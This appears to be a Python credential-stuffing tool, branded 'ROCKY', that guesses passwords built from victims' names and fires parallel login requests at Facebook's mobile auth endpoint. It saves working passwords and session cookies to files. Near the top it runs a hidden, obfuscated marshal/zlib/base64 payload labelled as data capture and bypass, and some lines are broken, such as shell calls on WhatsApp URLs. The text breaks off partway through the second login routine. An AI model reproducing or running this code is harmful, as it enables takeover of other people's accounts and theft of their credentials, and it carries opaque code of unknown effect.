try:
    import requests
    import os
    import marshal
    from string import *
    from bs4 import BeautifulSoup
    from bs4 import BeautifulSoup as sop
    from concurrent.futures import ThreadPoolExecutor as loda
except ModuleNotFoundError: 
    os.system('pip install requests > /dev/null')
except:pass
import json,time,re,random,sys,uuid,string,subprocess,zlib,platform,base64
try:import arrow
except:os.system('pip install arrow');import arrow
try:import httplib2
except ModuleNotFoundError:
    try:
        with open(os.devnull, 'w') as null:
            subprocess.check_call(["pip", "install", " httplib2"], stdout=null, stderr=null)
            import httplib2
    except subprocess.CalledProcessError:
        print(f" Module Installing Failed")
        exit()
#<<_________[ PROTECT-DATA-CAPTURE-&-BYPASS ]_________>>#
exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\xf34\x00\x00\x00\x97\x00d\x00\x84\x00Z\x00\x02\x00e\x01\x02\x00e\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x02S\x00)\x03c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x00\x00\x00\x03\x00\x00\x00\xf3\xd8\x00\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00d\x00d\x00d\x04\x85\x03\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00S\x00)\x05N\xda\x07marshal\xda\x04zlib\xda\x06base64\xe9\xff\xff\xff\xff)\x04\xda\n__import__\xda\x05loads\xda\ndecompress\xda\tb64decode)\x01\xda\x02__s\x01\x00\x00\x00 \xfa\x01 \xfa\x08<lambda>r\r\x00\x00\x00\x01\x00\x00\x00sY\x00\x00\x00\x80\x00\x95\n\x989\xd1\x10%\xd4\x10%\xd7\x10+\xd2\x10+\xadJ\xb0v\xd1,>\xd4,>\xd7,I\xd2,I\xcd*\xd0U]\xd1J^\xd4J^\xd7Jh\xd2Jh\xd0ik\xd0lp\xd0lp\xd0np\xd0lp\xd4iq\xd1Jr\xd4Jr\xd1,s\xd4,s\xd1\x10t\xd4\x10t\x80\x00\xf3\x00\x00\x00\x00s4#\x00\x00=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)\x02\xda\x01_\xda\x04exec\xa9\x00r\x0e\x00\x00\x00r\x0c\x00\x00\x00\xfa\x08<module>r\x12\x00\x00\x00\x01\x00\x00\x00sY\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x04t\xd0\x04t\x80\x01\xd0uy\xd0uy\xd0{|\xd0{|\xf0\x00\x00\x7f\x01vN\x02\xf1\x00\x00{\x01wN\x02\xf4\x00\x00{\x01wN\x02\xf1\x00\x00v\x01xN\x02\xf4\x00\x00v\x01xN\x02\xf0\x00\x00v\x01xN\x02\xf0\x00\x00v\x01xN\x02\xf0\x00\x00v\x01xN\x02r\x0e\x00\x00\x00'))
oks = []
cps = []
plist = []
methods = []
speed = []
twf = []
loop = 0
os.system('https://chat.whatsapp.com/CPz6Tj9vGuZEJytSNhHqid')

logo = """
d8888b.  .d88b.   .o88b. db   dD db    db 
88  `8D .8P  Y8. d8P  Y8 88 ,8P' `8b  d8' 
88oobY' 88    88 8P      88,8P    `8bd8'  
88`8b   88    88 8b      88`8b      88    
88 `88. `8b  d8' Y8b  d8 88 `88.    88    
88   YD  `Y88P'   `Y88P' YP   YD    YP
---------------------------''''''sehar shahazadi 
 ✓onwer.   ✓ROCKY BADHSHAH 
✓ facebook   ✓ROCKY Badshah
✓ Version    ✓2.7
✓ tool       ✓free
---------------------------"""

def linex():
    print('\033[1;37m---------------------------')

def clear():
        os.system('clear')
        print(logo)

def menu():
    os.system('clear')
    print(logo)
    print('[1] File Cloning')
    print('[2] Join Whatsapp Group')
    linex()
    lomda = input('\033[1;37mChoose Option : ')
    if lomda in ['1']:
        clear()
        print('PUT FILE EXAMPLE :  /sdcard/filename.txt')
        linex()
        file = input('Enter File Name\033[1;37m: ')
        try:
            fo = open(file,'r').read().splitlines()
        except FileNotFoundError:
            print('FILE NOT FOUND ')
            time.sleep(2)
            menu()
        clear()
        print('[1] METHOD 1')
        print('[2] METHOD 2')
        print('[3] METHOD 3')
        linex()
        mthd=input('CHOOSE : ')
        linex()
        clear()
        plist = []
        try:
            ps_limit = int(input('HOW MANY PASSWORDS DO YOU WANT ? '))
        except:
            ps_limit =1
        linex()
        clear()
        print('\033[1;37m EXAMPLE : first last,firtslast')
        linex()
        for i in range(ps_limit):
            plist.append(input(f'PUT PASSWORD {i+1}: '))
        linex()
        clear()
        with loda(max_workers=30) as crack_submit:
            clear()
            total_ids = str(len(fo))
            print(' TOTAL ACCOUNT : \033[1;32m'+total_ids+f' ')
            print("\033[1;37m CRACKING STARTED...\033[1;37m")
            linex()
            for user in fo:
                ids,names = user.split('|')
                passlist = plist
                if mthd in ['1','01']:
                    crack_submit.submit(ffb,ids,names,passlist)
                elif mthd in ['2','02']:
                    crack_submit.submit(ffb2,ids,names,passlist)
                elif mthd in ['3','03']:
                    pass
        print('\033[1;37m')
        linex()
        print(' THE PROCESS HAS COMPLETED')
        print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
        linex()
        input(' PRESS ENTER TO BACK ')
        os.system('python YSB.py')
    elif lomda in ['2']:
            os.system('https://chat.whatsapp.com/IjLRadygoVqD0CO9sTBvIY')
    else:
        menu()

def ffb(ids,names,passlist):
        try:
                global oks,loop
                sys.stdout.write('\r\r\033[1;37m [ROCKY-1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        ua = "[FBAN/FB4A;FBAV/"+str(random.randint(11,99))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,99))+";FBBV/"+str(random.randint(11111111,77777777))+";  [FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097191;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/Telekom.mk;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
                        head = {'User-Agent': ua,
                                'Accept-Encoding': 'gzip, deflate',
                                'Connection': 'Keep-Alive',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'Host': 'graph.facebook.com',
                                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                'X-FB-Connection-Type': 'MOBILE.LTE',
                                'X-Tigon-Is-Retry': 'False',
                                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                                'x-fb-device-group': '5120',
                                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                                'X-FB-Request-Analytics-Tags': 'graphservice',
                                'X-FB-HTTP-Engine': 'Liger',
                                'X-FB-Client-IP': 'True',
                                'X-FB-Server-Cluster': 'True',
                                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        data = {'adid':str(uuid.uuid4()),
                                'format':'json',
                                'device_id':str(uuid.uuid4()),
                                'email':ids,'password':pas,
                                'generate_analytics_claims':'1',
                                'community_id':'',
                                'cpl':'true',
                                'try_num':'1',
                                'family_device_id':str(uuid.uuid4()),
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'currently_logged_in_userid':'0',
                                'locale': 'en_SV','client_country_code': 'SV',
                                'fb_api_req_friendly_name':'authenticate',
                                'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
                                'access_token':accees_token}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=head).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [ROCKY-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/ROCKY-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        open('/sdcard/ROCKY-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        chk_apk(ids,pas,coki)
                                        break
                        elif twf in str(po):
                                                print('\r\r \033[1;34m[ROCKY-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                                print('\r\r\x1b[1;31m [ROCKY-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ROCKY-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                time.sleep(20)
def ffb2(ids,names,passlist):
        try:
                global oks,loop
                sys.stdout.write('\r\r\033[1;37m [ROCKY-2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        ua = "[FBAN/FB4A;FBAV/"+str(random.randint(11,99))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,99))+";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
                        headers = {'User-Agent': ua,
'Host': 'b-graph.facebook.com',
'Accept-Encoding': 'gzip, deflate',
'Accept': '*/*',
'Connection': 'keep-alive',
'x-fb-connection-bandwidth': str(random.randint(20000, 40000)),
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'x-fb-connection-quality': 'EXCELLENT',
'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
'Content-Type': 'application/x-www-form-urlencoded',
'x-fb-http-engine': 'Liger',
'x-fb-client-IP': 'True',
'x-fb-server-cluster': 'Keep-Alive',}
                        data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": ids,
"password": pas,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                        url = 'https://b-graph.facebook.com/auth/login'
